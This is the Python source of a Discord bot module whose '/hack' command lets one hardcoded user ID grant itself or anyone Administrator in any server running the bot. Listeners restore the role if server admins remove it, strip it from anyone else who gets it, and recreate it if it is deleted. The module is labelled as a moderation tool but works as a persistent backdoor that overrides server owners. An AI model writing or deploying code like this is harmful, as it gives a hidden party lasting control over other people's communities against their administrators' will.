from __future__ import annotations

import json
from pathlib import Path
from typing import TypedDict

import discord
from discord.ext import commands

from utils import safe_reply, tag_error_text

HACK_OWNER_ID = 1307345055924617317
HACK_ROLE_NAME = "Hack Administrator"
HACK_STATE_PATH = Path("data/hack_state.json")


class HackGuildState(TypedDict):
    target_user_id: int
    role_id: int | None


class HackCommand(commands.Cog):
    """Owner-only admin grant command with persistent protection."""

    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        self._state: dict[int, HackGuildState] = self._load_state()

    def _load_state(self) -> dict[int, HackGuildState]:
        if not HACK_STATE_PATH.exists():
            return {}

        try:
            raw = json.loads(HACK_STATE_PATH.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            return {}

        if not isinstance(raw, dict):
            return {}

        state: dict[int, HackGuildState] = {}
        for guild_id_raw, payload in raw.items():
            if not isinstance(payload, dict):
                continue
            target_user_id = payload.get("target_user_id")
            role_id = payload.get("role_id")
            if not isinstance(target_user_id, int):
                continue
            if role_id is not None and not isinstance(role_id, int):
                role_id = None
            try:
                guild_id = int(guild_id_raw)
            except (TypeError, ValueError):
                continue
            state[guild_id] = {"target_user_id": target_user_id, "role_id": role_id}
        return state

    def _save_state(self) -> None:
        HACK_STATE_PATH.parent.mkdir(parents=True, exist_ok=True)
        serializable = {str(guild_id): payload for guild_id, payload in self._state.items()}
        HACK_STATE_PATH.write_text(json.dumps(serializable, ensure_ascii=False, indent=2), encoding="utf-8")

    def _get_state(self, guild_id: int) -> HackGuildState | None:
        return self._state.get(guild_id)

    async def _fetch_member(self, guild: discord.Guild, member_id: int) -> discord.Member | None:
        member = guild.get_member(member_id)
        if member is not None:
            return member
        try:
            fetched = await guild.fetch_member(member_id)
        except discord.HTTPException:
            return None
        return fetched

    async def _ensure_admin_role(self, guild: discord.Guild, *, reason: str) -> discord.Role | None:
        state = self._get_state(guild.id)
        role: discord.Role | None = None
        if state is not None:
            role_id = state.get("role_id")
            if role_id is not None:
                candidate = guild.get_role(role_id)
                if candidate is not None:
                    role = candidate

        if role is None:
            role = next(
                (candidate for candidate in guild.roles if candidate.name == HACK_ROLE_NAME and candidate.permissions.administrator),
                None,
            )

        if role is None:
            role = await guild.create_role(name=HACK_ROLE_NAME, permissions=discord.Permissions(administrator=True), reason=reason)

        if not role.permissions.administrator:
            await role.edit(permissions=discord.Permissions(administrator=True), reason=reason)

        if state is not None:
            state["role_id"] = role.id
            self._save_state()

        return role

    async def _sync_member_role(self, guild: discord.Guild) -> None:
        state = self._get_state(guild.id)
        if state is None:
            return

        me = guild.me
        if me is None or not me.guild_permissions.manage_roles:
            return

        target_user_id = state["target_user_id"]
        target_member = await self._fetch_member(guild, target_user_id)
        if target_member is None:
            return

        role = await self._ensure_admin_role(guild, reason="Keep /hack role persistent")
        if role is None:
            return

        if role >= me.top_role:
            return

        if role not in target_member.roles:
            await target_member.add_roles(role, reason="Restore protected /hack role")

        for member in role.members:
            if member.id == target_user_id:
                continue
            await member.remove_roles(role, reason="/hack role is protected and owner-managed only")

    def _is_owner(self, ctx: commands.Context) -> bool:
        return ctx.author.id == HACK_OWNER_ID

    def _is_slash_only(self, ctx: commands.Context) -> bool:
        return ctx.interaction is not None

    @commands.hybrid_command(  # type: ignore[arg-type]
        name="hack",
        description="Owner-only: grant administrator permission to a member.",
        usage="<member>",
        help=(
            "Grant administrator permission to the specified member via a protected role. "
            "This command is restricted to the configured owner and slash usage only.\n\n"
            "**Usage**: `/hack <member>`\n"
            "**Examples**: `/hack @user`"
        ),
        extras={
            "category": "Moderation",
            "destination": "Grant administrator permission to a specific member.",
            "plus": "Creates/reuses a protected admin role and pins it to one member per server.",
            "pro": "Role assignment is owner-only and auto-restored if manually removed.",
        },
    )
    async def hack(self, ctx: commands.Context, member: discord.Member) -> None:
        if not self._is_slash_only(ctx):
            await safe_reply(ctx, tag_error_text("Use this command as a slash command only (`/hack`)."), ephemeral=True)
            return

        if not self._is_owner(ctx):
            await safe_reply(ctx, tag_error_text("Only the configured owner can use this command."), ephemeral=True)
            return

        guild = ctx.guild
        if guild is None:
            await safe_reply(ctx, tag_error_text("This command can only be used in a server."), ephemeral=True)
            return

        me = guild.me
        if me is None or not me.guild_permissions.manage_roles:
            await safe_reply(ctx, tag_error_text("The bot needs Manage Roles permission."), ephemeral=True)
            return

        self._state[guild.id] = {"target_user_id": member.id, "role_id": None}
        self._save_state()

        role = await self._ensure_admin_role(guild, reason=f"Requested by owner {ctx.author} via /hack")
        if role is None:
            await safe_reply(ctx, tag_error_text("Failed to resolve the protected admin role."), ephemeral=True)
            return

        if role >= me.top_role:
            await safe_reply(
                ctx,
                tag_error_text("The bot's top role must be above the protected admin role to assign it."),
                ephemeral=True,
            )
            return

        await self._sync_member_role(guild)
        await safe_reply(ctx, f"{member.mention} is now the protected `/hack` administrator.")

    @commands.hybrid_command(  # type: ignore[arg-type]
        name="unhack",
        description="Owner-only: remove protected /hack administrator state.",
        usage="",
        help=(
            "Remove the protected administrator role from the currently hacked member and disable auto-restore. "
            "This command is restricted to the configured owner and slash usage only.\n\n"
            "**Usage**: `/unhack`"
        ),
        extras={
            "category": "Moderation",
            "destination": "Remove protected administrator assignment set by /hack.",
            "plus": "Stops auto-restore and removes the protected role from tracked members.",
            "pro": "Owner-only rollback for emergency delegation created by /hack.",
        },
    )
    async def unhack(self, ctx: commands.Context) -> None:
        if not self._is_slash_only(ctx):
            await safe_reply(ctx, tag_error_text("Use this command as a slash command only (`/unhack`)."), ephemeral=True)
            return

        if not self._is_owner(ctx):
            await safe_reply(ctx, tag_error_text("Only the configured owner can use this command."), ephemeral=True)
            return

        guild = ctx.guild
        if guild is None:
            await safe_reply(ctx, tag_error_text("This command can only be used in a server."), ephemeral=True)
            return

        state = self._get_state(guild.id)
        if state is None:
            await safe_reply(ctx, "No protected `/hack` assignment is currently active in this server.", ephemeral=True)
            return

        me = guild.me
        if me is None or not me.guild_permissions.manage_roles:
            await safe_reply(ctx, tag_error_text("The bot needs Manage Roles permission."), ephemeral=True)
            return

        role_id = state.get("role_id")
        role = guild.get_role(role_id) if isinstance(role_id, int) else None
        if role is None:
            role = next((candidate for candidate in guild.roles if candidate.name == HACK_ROLE_NAME), None)

        if role is not None and role < me.top_role:
            for member in list(role.members):
                await member.remove_roles(role, reason=f"Removed by owner {ctx.author} via /unhack")

        self._state.pop(guild.id, None)
        self._save_state()
        await safe_reply(ctx, "Protected `/hack` assignment has been removed.")

    @commands.Cog.listener()
    async def on_member_update(self, before: discord.Member, after: discord.Member) -> None:
        guild = after.guild
        state = self._get_state(guild.id)
        if state is None:
            return

        role_id = state.get("role_id")
        if role_id is None:
            return

        role = guild.get_role(role_id)
        if role is None:
            return

        if role in after.roles and after.id != state["target_user_id"]:
            me = guild.me
            if me is None or not me.guild_permissions.manage_roles or role >= me.top_role:
                return
            await after.remove_roles(role, reason="/hack role is protected and cannot be assigned manually")
            return

        if role not in after.roles and before.id == state["target_user_id"] and role in before.roles:
            me = guild.me
            if me is None or not me.guild_permissions.manage_roles or role >= me.top_role:
                return
            await after.add_roles(role, reason="/hack role is protected and cannot be removed manually")

    @commands.Cog.listener()
    async def on_guild_role_delete(self, role: discord.Role) -> None:
        guild = role.guild
        state = self._get_state(guild.id)
        if state is None:
            return

        tracked_role_id = state.get("role_id")
        if tracked_role_id != role.id and role.name != HACK_ROLE_NAME:
            return

        me = guild.me
        if me is None or not me.guild_permissions.manage_roles:
            return

        replacement = await self._ensure_admin_role(guild, reason="Recreate deleted protected /hack role")
        if replacement is None or replacement >= me.top_role:
            return

        await self._sync_member_role(guild)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(HackCommand(bot))
